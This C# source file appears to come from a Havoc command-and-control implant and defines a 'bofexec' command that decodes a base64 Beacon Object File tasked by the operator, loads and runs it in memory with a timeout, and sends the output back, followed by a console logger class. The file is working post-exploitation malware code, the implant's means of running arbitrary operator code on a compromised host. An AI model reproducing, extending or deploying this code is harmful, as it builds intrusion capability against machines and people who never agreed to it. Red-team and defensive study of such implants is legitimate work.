using HavocImplant.AgentFunctions.BofExec.Internals;
using System;
using System.Runtime.CompilerServices;
using System.Diagnostics;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Threading.Tasks;
namespace HavocImplant.AgentFunctions.BofExec
{
    public class BofExec : CommandInterface
    {
        private const int ERROR_INVALID_COMMAND_LINE = 0x667;
        public override string Command => "bofexec";
        public override bool Dangerous => true;
        public override async Task Run(int taskId)
        {
            Output = "";
            Logger.Info("Starting RunOF [x64]");

            ParsedArgs ParsedArgs;
            try
            {
                ParsedArgs = new ParsedArgs(); //No args for now cus client funky wunky

            } catch (ArgumentNullException)
            {
                Output += "ArgumentNullException\n";
                ReturnOutput(taskId);
                return;
            }
            catch (Exception e)
            {
                Output += $"Unable to parse application arguments: \n {e}\n";
                ReturnOutput(taskId);
                return;
            };

            ParsedArgs.filename = "bruh";
            ParsedArgs.file_bytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);
            ParsedArgs.of_args = new List<OfArg>();
            Logger.Info($"Loading object file {ParsedArgs.filename}");

            try
            {
                BofRunner bof_runner = new BofRunner(ParsedArgs);

                bof_runner.LoadBof();

                Logger.Info($"About to start BOF in new thread at {bof_runner.entry_point.ToInt64():X}");

                var Result = bof_runner.RunBof(30);
                
                Output += "------- BOF OUTPUT ------\n";
                Output += $"{Result.Output}\n";
                Output += "------- BOF OUTPUT FINISHED ------\n";

                List<byte> filtering = Encoding.UTF8.GetBytes(Output).ToList<byte>();
                int index = filtering.IndexOf(0x09);
                while (index >= 0)
                {
                    filtering[index] = 0x20;
                    filtering.InsertRange(index, new byte[] { 0x20, 0x20, 0x20 });
                    index = filtering.IndexOf(0x09);
                }
                Output = Encoding.UTF8.GetString(filtering.ToArray());

                ReturnOutput(taskId);


            } catch (Exception e)
            {
                Logger.Error($"Error! {e}");
                Output = "Some error occured";
                ReturnOutput(taskId);
                return;
            }

        }

       
    }
    //uncomment the Console.WriteLine for debug
    public static class Logger
    {
        public enum LogLevels
        {
            ERROR,
            INFO,
            DEBUG
        }

        public static LogLevels Level { get; set; } = LogLevels.INFO;


        static Logger()
        {

        }

        public static void Debug(string Message, [CallerMemberName] string caller = "")
        {
            var methodInfo = new StackTrace().GetFrame(1).GetMethod();
            var className = methodInfo.ReflectedType.Name;
            //if (Level >= LogLevels.DEBUG) 
                Console.WriteLine($"[=] [{className}:{methodInfo}] {Message}");
        }

        public static void Info(string Message)
        {
            //if (Level >= LogLevels.INFO) 
                Console.WriteLine($"[*] {Message}");
        }

        public static void Error(string Message)
        {
            //if (Level >= LogLevels.ERROR) 
                Console.WriteLine($"[!!] {Message}");
        }
    }
}
